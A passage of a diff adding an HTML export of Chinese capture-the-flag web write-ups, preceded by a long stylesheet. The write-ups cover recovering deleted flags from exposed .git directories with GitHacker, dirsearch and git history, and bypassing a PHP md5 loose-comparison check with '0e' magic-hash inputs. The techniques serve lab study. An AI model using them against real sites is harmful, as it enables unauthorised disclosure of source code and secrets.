@@ -1,0 +1,1202 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>WebWriteUp</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+
+	table.collection-content {
+		width: 100%;
+		table-layout: fixed;
+	}
+
+	table.collection-content th,
+	table.collection-content td {
+		overflow-wrap: anywhere;
+	}
+
+	table.collection-content td > .user,
+	table.collection-content td > time {
+		white-space: pre-wrap;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content-wrapper {
+	overflow-x: auto;
+}
+
+@media only print {
+	.collection-content-wrapper {
+		overflow-x: visible;
+	}
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	gap: 46px;
+}
+
+.column {
+	min-width: 0;
+	overflow: hidden;
+}
+
+.column > *:first-child {
+	margin-top: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+table {
+	border-collapse: collapse;
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol.numbered-list.numbered-list-digits-2 {
+	padding-inline-start: 2em;
+}
+
+ol.numbered-list.numbered-list-digits-3plus {
+	padding-inline-start: 2.4em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="3db8db55-6aee-82df-8d8a-8189ec99f2b3" class="page mono"><header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/webb1.jpg" style="object-position:center 50%"/><div class="page-header-icon page-header-icon-with-cover"><span class="icon">📝</span></div><h1 class="page-title" dir="auto">WebWriteUp</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="auto"><ul id="5248db55-6aee-8243-8049-81b4f6a8b84f" class="toggle"><li><details open=""><summary>[CTFHub-技能数]-Log（git泄露）</summary><div style="display:contents" dir="auto"><p id="97f8db55-6aee-8238-ba7f-81b962afff30" class=""><strong>1、</strong>将题目的网址是github路径，使用githacker提取内容目录</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" integrity="sha512-whYhDwtTmlC/NpZlCr6PSsAaLOrfjVg/iXAnC4H/dtiHawpShhT2SlIMbpIhT/IL/NrpdMm+Hq2C13+VKpHTYw==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="d238db55-6aee-8272-ac7d-81b3089f083b" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">githacker --url http://challenge-6a4b0a0915b780da.sandbox.ctfhub.com:10800/.git --output-folder filename_test
+# --url [http....]/.git # 是目标网站
+# --output-folder # 输出文件的目录</code></pre></div><div style="display:contents" dir="ltr"><figure id="2888db55-6aee-837e-ab2f-81fa4d2d94e2" class="image"><a href="WebWriteUp/Snipaste_2025-07-12_16-49-54.png"><img style="width:682px" src="WebWriteUp/Snipaste_2025-07-12_16-49-54.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="d3a8db55-6aee-8206-9142-81c05aa088bd" class=""><strong>2、</strong>进入拷贝下来的目录，并查看提交记录</p></div><div style="display:contents" dir="auto"><pre id="3af8db55-6aee-828b-945e-011b500525e0" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">cd filename_test/7dc feb94d7b5dca7222a51a19b020a5d  # 进入下载的仓库目录
+git log  # 查看 Git 提交记录</code></pre></div><div style="display:contents" dir="ltr"><figure id="e2d8db55-6aee-83a9-8b53-819d8c4d6aec" class="image"><a href="WebWriteUp/Snipaste_2025-07-12_16-50-34.png"><img style="width:682px" src="WebWriteUp/Snipaste_2025-07-12_16-50-34.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="cac8db55-6aee-837e-a4bc-015e2bd33577" class="image"><a href="WebWriteUp/Snipaste_2025-07-12_16-51-01.png"><img style="width:682px" src="WebWriteUp/Snipaste_2025-07-12_16-51-01.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2b18db55-6aee-83b5-a017-81c4e45a5cba" class="">分析：</p></div><div style="display:contents" dir="auto"><pre id="9e38db55-6aee-82ba-9eb6-819b3a619813" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">commit ce4c0d1898c273369c6ea95b5094215cad4ae9c4  # 最新提交：remove flag（删除 Flag）
+commit d780f0175b65155cf6bca908730105dfc9484c25  # 中间提交：add flag（添加 Flag）
+commit e697414f0d5435e2e5a4f400d44fe3e12cab1fcb  # 初始提交：init</code></pre></div><div style="display:contents" dir="auto"><p id="8828db55-6aee-836c-bde9-815316bcfff0" class=""><strong>3、</strong>比较版本差异，并提取被删除的flag</p></div><div style="display:contents" dir="auto"><pre id="1298db55-6aee-821a-929d-8146b2a5d015" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">git diff d780f0175b65155cf6bca908730105dfc9484c25  # 比较「add flag」和当前版本的差异</code></pre></div><div style="display:contents" dir="ltr"><figure id="acd8db55-6aee-82c6-b144-81a7e6fc9068" class="image"><a href="WebWriteUp/Snipaste_2025-07-12_16-52-11.png"><img style="width:682px" src="WebWriteUp/Snipaste_2025-07-12_16-52-11.png"/></a></figure></div><div style="display:contents" dir="auto"><hr id="e958db55-6aee-82b4-942f-8186bdf5e5cf"/></div><div style="display:contents" dir="auto"><p id="7308db55-6aee-8255-a317-01be32d2c92c" class=""><strong>完整攻击链：</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="45d8db55-6aee-8319-a3ec-815c7004cf00" class="numbered-list" start="1"><li><strong>发现漏洞</strong>：目标网站暴露 <code>.git</code> 目录（可通过目录扫描工具或手动访问验证）。</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="d0a8db55-6aee-83d3-8a5a-017966a0e6e7" class="numbered-list" start="2"><li><strong>下载仓库</strong>：用 GitHacker 下载 <code>.git</code> 目录，重建本地仓库。</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="79a8db55-6aee-832e-b5fb-8157b1d16c52" class="numbered-list" start="3"><li><strong>分析历史</strong>：通过 <code>git log</code> 发现 “添加 Flag” 和 “删除 Flag” 的提交。</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="1d78db55-6aee-83bc-a9ba-81e3f963c820" class="numbered-list" start="4"><li><strong>提取内容</strong>：用 <code>git diff</code> 比较两个版本，找到被删除的 Flag。</li></ol></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="7858db55-6aee-82e5-b211-818f92123b79" class="toggle"><li><details open=""><summary>[BugKu]-source（git泄露，工具使用）</summary><div style="display:contents" dir="auto"><p id="6548db55-6aee-8246-952e-01496de32c5b" class="">1、首先使用dirsearch工具扫描网站文件</p></div><div style="display:contents" dir="ltr"><figure id="dbc8db55-6aee-82cd-8021-81130d81760b" class="image"><a href="WebWriteUp/Snipaste_2025-07-31_20-18-08.png"><img style="width:681.97265625px" src="WebWriteUp/Snipaste_2025-07-31_20-18-08.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="1ab8db55-6aee-838e-89cf-8140d9160f70" class="image"><a href="WebWriteUp/Snipaste_2025-07-31_20-18-22.png"><img style="width:681.9921875px" src="WebWriteUp/Snipaste_2025-07-31_20-18-22.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="0658db55-6aee-82f2-97b7-010c1a46421d" class="">2、看到flag.txt，打开发现假flag</p></div><div style="display:contents" dir="auto"><p id="f388db55-6aee-8280-9419-81749a4ca506" class="">但是看到隐藏文件.git，意识到这是一个git仓库，在linux中提取一下</p></div><div style="display:contents" dir="ltr"><figure id="8928db55-6aee-83fc-a7a9-812cc51f34b7" class="image"><a href="WebWriteUp/Snipaste_2025-07-31_20-21-21.png"><img style="width:681.9921875px" src="WebWriteUp/Snipaste_2025-07-31_20-21-21.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="e798db55-6aee-8289-b3d5-01fd286042c2" class="">3、查看一下历史提交记录</p></div><div style="display:contents" dir="ltr"><figure id="6278db55-6aee-82a5-8fbd-817f252996d9" class="image"><a href="WebWriteUp/Snipaste_2025-07-31_20-22-28.png"><img style="width:681.9856567382812px" src="WebWriteUp/Snipaste_2025-07-31_20-22-28.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="c1d8db55-6aee-83f2-b746-81aea5f24b06" class="">发现有关flag的内容，查看内容</p></div><div style="display:contents" dir="ltr"><figure id="2cf8db55-6aee-832c-bafd-01cc53a5b9dd" class="image"><a href="WebWriteUp/Snipaste_2025-07-31_20-23-00.png"><img style="width:681.9921875px" src="WebWriteUp/Snipaste_2025-07-31_20-23-00.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="c6a8db55-6aee-8296-bae6-817078188a43" class="toggle"><li><details open=""><summary>[BugKu]-备份是个好习惯（php弱比较构造）</summary><div style="display:contents" dir="auto"><p id="bbc8db55-6aee-83d2-9b71-817b57812065" class="">1、使用dirsearch扫描网站，发现index.php.bak文件，下载下来</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup-templating.min.js" integrity="sha512-+8BiRfWso6waiFDv6tEmWF8yfPGgxAtOYLDUB0rRISLwtpxkJ9lpPNUhxwWlikn3qSO+4RQyzDppi62o3ON/AA==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js" integrity="sha512-plzrTi61ltEMFf84gTVO9IkvIMfBu07bnDuahvdlIclmFWzXJ9VcRsny9d45sxFZRv3jJg/MHNyuxnUYEMxMEg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="9868db55-6aee-8375-8767-014adad6851b" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">&lt;?php
+// 包含flag文件
+include_once &quot;flag.php&quot;;
+// 关闭错误显示，避免泄露敏感信息
+ini_set(&quot;display_errors&quot;, 0);
+// 提取URL中“？”后面的参数部分
+$str = strstr($_SERVER[&#x27;REQUEST_URI&#x27;], &#x27;?&#x27;);
+// 去除前面一个字符“？”
+$str = substr($str,1);
+// 过滤参数中的&quot;key&quot;字符，所有字符被替换为空
+$str = str_replace(&#x27;key&#x27;,&#x27;&#x27;,$str);
+// 解析处理之后的参数为变量
+// 例如：&quot;key1=abc&amp;key2=def&quot; 会解析为 $key1=&quot;abc&quot;、$key2=&quot;def&quot;
+parse_str($str);
+// 计算key1和key2变量的md5
+echo md5($key1);
+echo md5($key2);
+// 需要满足key1与key2的md5相同，但是key1和key2不相等，时输出flag
+if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){
+    echo $flag.&quot;取得flag&quot;;
+}
+?&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="d5b8db55-6aee-8317-be63-01c2f8485880" class="">在php中，==只比较值，而不比较类型，md5如果不同字符串都是</p></div><div style="display:contents" dir="auto"><p id="3718db55-6aee-82bb-88dc-0197a1fc5219" class="">0e837….</p></div><div style="display:contents" dir="auto"><p id="00e8db55-6aee-8213-83a7-011223dc17d0" class="">0e231…..</p></div><div style="display:contents" dir="auto"><p id="9428db55-6aee-828d-8396-8175f7e53be2" class="">类型的，比较会识别为科学计数法，而只比较0e，此时在==比较下，两值相等。</p></div><div style="display:contents" dir="auto"><p id="c808db55-6aee-83b3-b86a-81c9963438d8" class="">利用弱比较==的特性，构造key1和key2</p></div><div style="display:contents" dir="auto"><p id="4738db55-6aee-8364-ad05-81784125f29b" class=""><code>md5(&quot;QNKCDZO&quot;)</code> → <code>0e830400451993494058024219903391</code></p></div><div style="display:contents" dir="auto"><p id="55e8db55-6aee-820c-8d40-818650d208b0" class=""><code>md5(&quot;240610708&quot;)</code> → 